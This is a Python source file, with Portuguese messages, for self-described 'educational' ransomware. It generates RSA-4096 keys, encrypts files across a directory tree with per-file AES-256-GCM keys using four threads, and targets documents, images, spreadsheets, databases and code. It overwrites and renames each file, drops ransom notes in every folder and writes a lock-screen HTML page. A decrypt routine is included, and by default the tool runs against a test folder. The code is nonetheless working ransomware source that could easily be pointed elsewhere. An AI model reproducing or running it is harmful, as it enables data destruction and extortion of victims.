#!/usr/bin/env python3
import os
import sys
import hashlib
import base64
import json
import threading
import time
from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

class AdvancedRansomware:
    def __init__(self, target_dir="./test_files"):
        self.target_dir = target_dir
        self.session_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        self.master_key = None
        self.private_key = None
        self.public_key = None
        self.encrypted_files = []
        self.key_file = f".key_{self.session_id}.enc"
        self.log_file = f".log_{self.session_id}.json"
        self.threads = []
        self.max_threads = 4
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
            '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
            '.zip', '.rar', '.sql', '.csv', '.json', '.xml',
            '.html', '.css', '.js', '.py', '.java', '.cpp'
        ]
        
    def generate_rsa_keys(self):
        print("[+] Gerando par de chaves RSA-4096...")
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()
        
        pem_private = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        with open('master_private.key', 'wb') as f:
            f.write(pem_private)
        
        print("[+] Chaves RSA geradas com sucesso")
        
    def generate_session_key(self):
        self.master_key = os.urandom(32)
        
        encrypted_master = self.public_key.encrypt(
            self.master_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        with open(self.key_file, 'wb') as f:
            f.write(encrypted_master)
        
        print(f"[+] Chave de sessão gerada e criptografada: {self.key_file}")
        
    def load_master_key(self):
        if not os.path.exists('master_private.key') or not os.path.exists(self.key_file):
            print("[-] Chaves não encontradas!")
            return False
        
        with open('master_private.key', 'rb') as f:
            self.private_key = serialization.load_pem_private_key(
                f.read(),
                password=None,
                backend=default_backend()
            )
        
        with open(self.key_file, 'rb') as f:
            encrypted_master = f.read()
        
        self.master_key = self.private_key.decrypt(
            encrypted_master,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        print("[+] Chave mestre carregada com sucesso")
        return True
    
    def derive_file_key(self, filepath):
        salt = hashlib.sha256(filepath.encode()).digest()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return kdf.derive(self.master_key)
    
    def encrypt_file_aes(self, filepath):
        try:
            file_key = self.derive_file_key(filepath)
            
            with open(filepath, 'rb') as f:
                data = f.read()
            
            iv = os.urandom(16)
            
            cipher = Cipher(
                algorithms.AES(file_key),
                modes.GCM(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(data) + encryptor.finalize()
            encrypted_data = iv + encryptor.tag + ciphertext
            
            # Sobrescreve arquivo
            with open(filepath, 'wb') as f:
                f.write(encrypted_data)
            
            # Renomeia com extensão personalizada
            new_name = f"{filepath}.{self.session_id}"
            os.rename(filepath, new_name)
            
            self.encrypted_files.append({
                'original': filepath,
                'encrypted': new_name,
                'size': len(data),
                'timestamp': time.time()
            })
            
            print(f"[+] Criptografado: {os.path.basename(filepath)}")
            return True
            
        except Exception as e:
            print(f"[-] Erro ao criptografar {filepath}: {e}")
            return False
    
    def decrypt_file_aes(self, filepath, original_name):
        try:
            file_key = self.derive_file_key(original_name)
            
            with open(filepath, 'rb') as f:
                encrypted_data = f.read()
            
            iv = encrypted_data[:16]
            tag = encrypted_data[16:32]
            ciphertext = encrypted_data[32:]
            
            cipher = Cipher(
                algorithms.AES(file_key),
                modes.GCM(iv, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            with open(original_name, 'wb') as f:
                f.write(plaintext)
            
            # Remove arquivo criptografado
            os.remove(filepath)
            
            print(f"[+] Descriptografado: {os.path.basename(original_name)}")
            return True
            
        except Exception as e:
            print(f"[-] Erro ao descriptografar {filepath}: {e}")
            return False
    
    def should_encrypt(self, filepath):
        if any(x in filepath for x in [self.key_file, self.log_file, 'master_', 'RANSOM_']):
            return False
        
        return any(filepath.lower().endswith(ext) for ext in self.target_extensions)
    
    def encrypt_worker(self, files_queue):
        while files_queue:
            try:
                filepath = files_queue.pop(0)
                if os.path.exists(filepath):
                    self.encrypt_file_aes(filepath)
            except IndexError:
                break
    
    def encrypt_directory(self):
        if not os.path.exists(self.target_dir):
            print(f"[-] Diretório não encontrado: {self.target_dir}")
            return
        
        print(f"\n[!] Iniciando criptografia multi-threaded em: {self.target_dir}")
        print(f"[!] Session ID: {self.session_id}")
        
        files_to_encrypt = []
        for root, dirs, files in os.walk(self.target_dir):
            for file in files:
                filepath = os.path.join(root, file)
                if self.should_encrypt(filepath):
                    files_to_encrypt.append(filepath)
        
        print(f"[!] {len(files_to_encrypt)} arquivos encontrados")
        
        start_time = time.time()
        
        for i in range(self.max_threads):
            t = threading.Thread(target=self.encrypt_worker, args=(files_to_encrypt,))
            t.start()
            self.threads.append(t)
        for t in self.threads:
            t.join()
        
        elapsed = time.time() - start_time
        log_data = {
            'session_id': self.session_id,
            'timestamp': time.time(),
            'files_count': len(self.encrypted_files),
            'elapsed_time': elapsed,
            'files': self.encrypted_files
        }
        
        with open(self.log_file, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        print(f"\n[+] Criptografia concluída!")
        print(f"[+] Arquivos criptografados: {len(self.encrypted_files)}")
        print(f"[+] Tempo decorrido: {elapsed:.2f}s")
        print(f"[+] Velocidade: {len(self.encrypted_files)/elapsed:.2f} arquivos/s")
        
        self.show_ransom_note()
        self.create_wallpaper()
    
    def decrypt_directory(self, log_file):
        with open(log_file, 'r') as f:
            log_data = json.load(f)
        
        files_to_decrypt = log_data['files']
        
        print(f"\n[!] Session ID: {self.session_id}")
        print(f"[!] Iniciando descriptografia de {len(files_to_decrypt)} arquivos...")
        
        start_time = time.time()
        decrypted_count = 0
        
        for file_info in files_to_decrypt:
            encrypted_path = file_info['encrypted']
            original_path = file_info['original']
            
            if os.path.exists(encrypted_path):
                if self.decrypt_file_aes(encrypted_path, original_path):
                    decrypted_count += 1
        
        elapsed = time.time() - start_time
        
        print(f"\n[+] Descriptografia concluída!")
        print(f"[+] Arquivos recuperados: {decrypted_count}/{len(files_to_decrypt)}")
        print(f"[+] Tempo decorrido: {elapsed:.2f}s")
        
        if os.path.exists(log_file):
            os.remove(log_file)
        if os.path.exists(self.key_file):
            os.remove(self.key_file)
    
    def show_ransom_note(self):
        note = f"""------____              ________________________________---
          \\_         __/    ___---------__
            \\      _/      /              \\_
             \\    /       /                 \\
              |  /       | _    _ \\          \\
              | |       / / \\  / \\ |          \\
              | |       ||   ||   ||           |
              | |       | \\_//\\\\_/ |           |
              | |       |_| (||)   |_______|   |
              | |         |  ||     | _  / /   |
               \\ \\        |_________|| \\/ /   /
                \\ \\_       |_|_|_|_|/|  _/___/
                 \\__>       _ _/_ _ /  |
                          .|_|_|_|_|   |Cuzinho Fresco
                          |           /
                          |__________/

🔒 SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! 🔒

Todos os seus dados importantes foram bloqueados com criptografia de nível militar (RSA-4096 + AES-256-GCM).

Seu ID de sessão único é: {self.session_id}

Para ter uma chance de recuperar seus arquivos, execute:
$ python main.py --decrypt
        """
        print(note)
        
        for root, dirs, files in os.walk(self.target_dir):
            note_path = os.path.join(root, "!!!RANSOM_NOTE!!!.txt")
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(note)
    
    def create_wallpaper(self):
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>ARQUIVOS CRIPTOGRAFADOS</title>
    <style>
        body {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: #fff;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            text-align: center;
            border: 3px solid #ff0000;
            padding: 50px;
            background: rgba(0,0,0,0.8);
            border-radius: 10px;
        }}
        h1 {{ color: #ff0000; font-size: 48px; }}
        .session {{ color: #00ff00; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ ARQUIVOS CRIPTOGRAFADOS ⚠️</h1>
        <p>Todos os seus arquivos foram bloqueados</p>
        <p class="session">Session ID: {self.session_id}</p>
        <p>Algoritmo: RSA-4096 + AES-256-GCM</p>
        <p style="color: #ffff00; margin-top: 30px;">
            [SIMULAÇÃO EDUCACIONAL]<br/>
            Execute: python main.py --decrypt
        </p>
    </div>
</body>
</html>
        """
        
        with open(os.path.join(self.target_dir, "WALLPAPER.html"), 'w') as f:
            f.write(html)

def create_test_environment():
    test_dir = "./test_files"
    os.makedirs(test_dir, exist_ok=True)
    
    subdirs = ['documents', 'images', 'data', 'code']
    for subdir in subdirs:
        os.makedirs(os.path.join(test_dir, subdir), exist_ok=True)
    test_files = {
        'documents/relatorio.txt': 'Relatório importante' * 100,
        'documents/contrato.docx': 'Contrato confidencial' * 50,
        'images/foto.jpg': b'\xff\xd8\xff\xe0' * 1000,
        'data/clientes.csv': 'nome,email,telefone\n' + 'Cliente,email@test.com,123456\n' * 50,
        'data/backup.sql': 'CREATE TABLE users;' * 100,
        'code/script.py': 'print("Hello World")' * 50,
        'confidencial.txt': 'Informações sensíveis' * 100,
    }
    
    for filepath, content in test_files.items():
        full_path = os.path.join(test_dir, filepath)
        mode = 'wb' if isinstance(content, bytes) else 'w'
        with open(full_path, mode) as f:
            f.write(content)
    
    print(f"[+] Ambiente de teste criado: {test_dir}")
    print(f"[+] {len(test_files)} arquivos em {len(subdirs)} diretórios")

def main():
    print("=" * 70)
    print("RANSOMWARE AVANÇADO EDUCACIONAL - APENAS PARA ESTUDO")
    print("AVISO: Use apenas em ambiente isolado e controlado!")
    print("=" * 70)
    
    if len(sys.argv) < 2:
        print("\nUso:")
        print("  python main.py --setup      # Cria ambiente de teste")
        print("  python main.py --encrypt    # Criptografa arquivos")
        print("  python main.py --decrypt    # Descriptografa arquivos")
        print("\nRecursos:")
        print("  • RSA-4096 + AES-256-GCM")
        print("  • Multi-threading")
        print("  • Derivação de chave por arquivo (PBKDF2)")
        print("  • Authenticated encryption (GCM)")
        return
    
    action = sys.argv[1]
    
    if action == "--setup":
        create_test_environment()
        
    elif action == "--encrypt":
        ransomware = AdvancedRansomware()
        ransomware.generate_rsa_keys()
        ransomware.generate_session_key()
        ransomware.encrypt_directory()
        
    elif action == "--decrypt":
        # Find the log file first to get the correct session ID
        log_files = [f for f in os.listdir('.') if f.startswith('.log_')]
        if not log_files:
            print("[-] Nenhum log de criptografia encontrado para iniciar a descriptografia!")
            return

        # Create an instance and immediately set the correct session context from the found log file
        ransomware = AdvancedRansomware()
        ransomware.session_id = log_files[0].split('_')[1].replace('.json', '')
        ransomware.key_file = f".key_{ransomware.session_id}.enc"

        if ransomware.load_master_key():
            ransomware.decrypt_directory(log_files[0]) # Pass the log file path
    else:
        print(f"[-] Ação desconhecida: {action}")

if __name__ == "__main__":
    main()